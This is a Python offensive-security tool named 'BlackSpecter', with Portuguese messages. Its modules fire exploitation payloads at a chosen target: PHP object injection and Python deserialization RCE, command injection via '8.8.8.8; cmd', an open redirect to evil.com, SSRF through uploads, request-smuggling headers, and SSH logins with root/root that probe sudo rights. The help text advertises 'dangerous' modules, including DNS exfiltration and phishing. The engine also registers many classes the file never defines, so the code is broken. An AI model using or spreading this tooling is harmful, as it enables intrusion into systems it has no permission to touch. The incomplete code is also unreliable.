import argparse
import json
import requests
import socket
import base64
import time
import paramiko
import urllib.parse

ASCII_ART = r'''
███████████  ████                     █████                          
░░███░░░░░███░░███                    ░░███                          
 ░███    ░███ ░███   ██████    ██████  ░███ █████                    
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                      
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                       
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                      
 ███████████  █████░░████████░░██████  ████ █████                    
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                      
                                                                      
                                                                      
                                                                      
  █████████                               █████                       
 ███░░░░░███                             ░░███                        
░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████  
░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███ 
 ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░  
 ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███      
░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████     
 ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░     
             ░███                                                   
             █████                                                  
            ░░░░░                                                  
'''

def log_info(msg):
    print(f"[INFO] {msg}")

def log_error(msg):
    print(f"[ERRO] {msg}")

def log_success(msg):
    print(f"[SUCESSO] {msg}")



class PHPObjectInjectionRCE:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/vulnerable.php')
        self.payload = config.get('payload')  

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        log_info(f"Tentando PHP Object Injection RCE em {url}")
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = f"data={urllib.parse.quote_plus(self.payload)}"
        try:
            r = requests.post(url, data=data, headers=headers, timeout=5)
            if r.status_code == 200 and ("command executed" in r.text.lower() or r.text.strip()):
                log_success("Resposta indica possível execução remota via PHP Object Injection!")
                log_info(r.text[:300])
            else:
                log_info(f"Resposta HTTP {r.status_code} recebida, sem indicação clara de sucesso.")
        except Exception as e:
            log_error(f"Erro na exploração PHP Object Injection RCE: {e}")

class CommandInjectionExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/ping')
        self.param = config.get('param', 'ip')
        self.cmd = config.get('cmd', 'whoami')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        payload = f"8.8.8.8; {self.cmd}"  
        params = {self.param: payload}
        log_info(f"Tentando Command Injection em {url} com payload: {payload}")
        try:
            r = requests.get(url, params=params, timeout=5)
            if r.status_code == 200:
                log_success("Resposta obtida, verificar saída do comando injetado:")
                log_info(r.text[:300])
            else:
                log_info(f"Falha com HTTP {r.status_code}")
        except Exception as e:
            log_error(f"Erro no Command Injection: {e}")

class OpenRedirectExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/redirect')
        self.param = config.get('param', 'url')
        self.redirect_url = config.get('redirect_url', 'http://evil.com')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        params = {self.param: self.redirect_url}
        log_info(f"Tentando Open Redirect em {url} redirecionando para {self.redirect_url}")
        try:
            r = requests.get(url, params=params, allow_redirects=False, timeout=5)
            location = r.headers.get('Location', '')
            if r.status_code in (301, 302) and self.redirect_url in location:
                log_success(f"Open Redirect detectado! Redireciona para: {location}")
            else:
                log_info("Resposta não indica Open Redirect.")
        except Exception as e:
            log_error(f"Erro na exploração Open Redirect: {e}")

class SSRFviaUploadAbuse:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.upload_path = config.get('upload_path', '/upload')
        self.internal_url = config.get('internal_url', 'http://127.0.0.1/admin')

    def run(self):
        url = f"{self.target}{self.upload_path}"
        log_info(f"Tentando SSRF via abuso de upload em {url} para acessar {self.internal_url}")
        files = {
            'file': ('ssrf.txt', f"GET {self.internal_url} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
        }
        try:
            r = requests.post(url, files=files, timeout=5)
            if r.status_code == 200 and "admin" in r.text.lower():
                log_success("SSRF via upload parece ter funcionado!")
                log_info(r.text[:300])
            else:
                log_info("Resposta não indica sucesso na SSRF via upload.")
        except Exception as e:
            log_error(f"Erro na SSRF via upload: {e}")

class SubdomainTakeoverCheck:
    def __init__(self, target, config):
        self.subdomain = target.rstrip('.')

    def run(self):
        log_info(f"Verificando subdomain takeover em {self.subdomain}")
        
        check_urls = [
            f"http://{self.subdomain}.s3.amazonaws.com",
            f"http://{self.subdomain}.github.io",
            f"http://{self.subdomain}.herokuapp.com"
        ]
        for url in check_urls:
            try:
                r = requests.get(url, timeout=5)
                if "NoSuchBucket" in r.text or "There isn't a GitHub Pages site here." in r.text or "No such app" in r.text:
                    log_success(f"Possível vulnerabilidade de subdomain takeover em {url}")
                else:
                    log_info(f"{url} parece não vulnerável.")
            except Exception as e:
                log_error(f"Erro ao verificar {url}: {e}")

class InsecurePythonDeserializationExploit:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/deserialize')
        self.payload = config.get('payload')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        headers = {'Content-Type': 'application/octet-stream'}
        data = base64.b64decode(self.payload)
        log_info(f"Tentando exploração de deserialização insegura Python em {url}")
        try:
            r = requests.post(url, data=data, headers=headers, timeout=5)
            if r.status_code == 200 and ("command executed" in r.text.lower() or r.text.strip()):
                log_success("Possível execução remota via deserialização insegura Python!")
                log_info(r.text[:300])
            else:
                log_info("Resposta não indica sucesso na exploração.")
        except Exception as e:
            log_error(f"Erro na exploração: {e}")

class HTTPRequestSmuggling:
    def __init__(self, target, config):
        self.target = target.rstrip('/')
        self.vuln_path = config.get('vuln_path', '/')
        self.payload = config.get('payload', 'smuggling_payload')

    def run(self):
        url = f"{self.target}{self.vuln_path}"
        log_info(f"Tentando HTTP Request Smuggling em {url}")
        
        try:

            r = requests.get(url, headers={
                'Content-Length': '4',
                'Transfer-Encoding': 'chunked',
                'X-Smuggling-Test': self.payload
            }, timeout=5)
            if r.status_code == 200:
                log_success("Requisição enviada; validar comportamento do servidor para detectar smuggling.")
            else:
                log_info(f"Resposta HTTP {r.status_code}")
        except Exception as e:
            log_error(f"Erro no teste de HTTP Request Smuggling: {e}")

class SudoPrivilegeEscalationCheck:
    def __init__(self, target, config):
        self.target = target  
        self.user = config.get('user', 'root')
        self.password = config.get('password', 'root')

    def run(self):
        log_info(f"Tentando verificar escalonamento de privilégio sudo em {self.target} via SSH")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(self.target, username=self.user, password=self.password, timeout=5)
            stdin, stdout, stderr = ssh.exec_command('sudo -l')
            output = stdout.read().decode()
            if 'NOPASSWD' in output or 'ALL' in output:
                log_success("Usuário pode executar comandos sudo sem senha! Possível escalonamento de privilégio.")
                log_info(output)
            else:
                log_info("Nenhum acesso sudo sem senha detectado.")
            ssh.close()
        except Exception as e:
            log_error(f"Erro na verificação sudo: {e}")



class SpecterEngine:
    def __init__(self):
        self.modules = {
            'sqliautoexploit': SQLiAutoExploit,
            'rceupload': RemoteCodeExecutionUpload,
            'phishingsimple': PhishingSimple,
            'deserializationexploit': DeserializationExploit,
            'bannergrabber': BannerGrabber,
            'dnsexfiltrationexample': DNSExfiltrationExample,
            'configfilepasswordfinder': ConfigFilePasswordFinder,
            'portscannerwithbanner': PortScannerWithBanner,
            'ldapinjectionexploit': LDAPInjectionExploit,
            'ssrfexploit': SSRFExploit,
            'sstiexploit': SSTIExploit,
            'xxeexploit': XXEExploit,
            'weaksshcredscheck': WeakSSHCredsCheck,
            'httpheaderinjection': HTTPHeaderInjection,

            'phpobjectinjectionrce': PHPObjectInjectionRCE,
            'commandinjectionexploit': CommandInjectionExploit,
            'openredirectexploit': OpenRedirectExploit,
            'ssrfviauploadabuse': SSRFviaUploadAbuse,
            'subdomaintakeovercheck': SubdomainTakeoverCheck,
            'insecurepythondeserializationexploit': InsecurePythonDeserializationExploit,
            'httprequestsmuggling': HTTPRequestSmuggling,
            'sudoprivilegeescalationcheck': SudoPrivilegeEscalationCheck,
        }

    def load_module(self, module_name, target, config):
        module_name = module_name.lower()
        if module_name not in self.modules:
            log_error(f"Módulo '{module_name}' não encontrado.")
            return False
        module_class = self.modules[module_name]
        module = module_class(target, config)
        module.run()
        return True



def show_help():
    print(ASCII_ART)
    print('''Uso: blackspecter.py --module MODULE --target TARGET [--config CONFIG]

BlackSpecter Framework Avançado

Módulos disponíveis:
  sqliautoexploit                 Exploração automática de SQL Injection
  rceupload                      Upload para execução remota de comandos
  phishingsimple                 Ataque phishing simples (exibição URL)
  deserializationexploit         Exploração de vulnerabilidade de deserialização
  bannergrabber                  Captura banners em portas abertas
  dnsexfiltrationexample         Exfiltra dados via consultas DNS
  configfilepasswordfinder       Busca arquivos config com senhas expostas
  portscannerwithbanner          Scanner de portas com captura de banners
  ldapinjectionexploit           Exploração de LDAP Injection
  ssrfexploit                   Exploração de SSRF
  sstiexploit                   Exploração de SSTI (Server Side Template Injection)
  xxeexploit                   Teste de vulnerabilidade XXE
  weaksshcredscheck             Teste de credenciais fracas em SSH
  httpheaderinjection           Teste de HTTP Header Injection

Novos módulos perigosos adicionados:
  phpobjectinjectionrce          Exploração RCE via PHP Object Injection
  commandinjectionexploit        Exploração de Command Injection via parâmetros
  openredirectexploit            Exploração de Open Redirect
  ssrfviauploadabuse             SSRF via abuso de upload
  subdomaintakeovercheck         Verificação de subdomain takeover
  insecurepythondeserializationexploit Exploração de deserialização insegura Python
  httprequestsmuggling           Teste básico de HTTP Request Smuggling
  sudoprivilegeescalationcheck  Verificação de escalonamento via sudo (SSH)

Opções:
  -h, --help       mostra essa ajuda e sai
  --module MODULE  Nome do módulo (exemplo: sqliautoexploit, rceupload, bannergrabber, ...)
  --target TARGET  Alvo (host/IP ou URL)
  --config CONFIG  Configuração JSON (opcional)

Exemplos:
  blackspecter.py --module phpobjectinjectionrce --target http://vulneravel.com --config '{"vuln_path":"/vulnerable.php","payload":"O:8:\"Exploit\":1:{s:4:\"cmd\";s:7:\"id\";}"}'
  blackspecter.py --module commandinjectionexploit --target http://example.com --config '{"vuln_path":"/ping","param":"ip","cmd":"whoami"}'
  blackspecter.py --module openredirectexploit --target http://example.com --config '{"vuln_path":"/redirect","param":"url","redirect_url":"http://evil.com"}'
''')

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('--module', required=False)
    parser.add_argument('--target', required=False)
    parser.add_argument('--config', required=False)
    parser.add_argument('-h', '--help', action='store_true')
    args = parser.parse_args()

    if args.help or not args.module or not args.target:
        show_help()
        return

    try:
        config = {}
        if args.config:
            config = json.loads(args.config)
    except Exception as e:
        log_error(f"Configuração JSON inválida: {e}")
        return

    engine = SpecterEngine()
    engine.load_module(args.module, args.target, config)

if __name__ == '__main__':
    main()
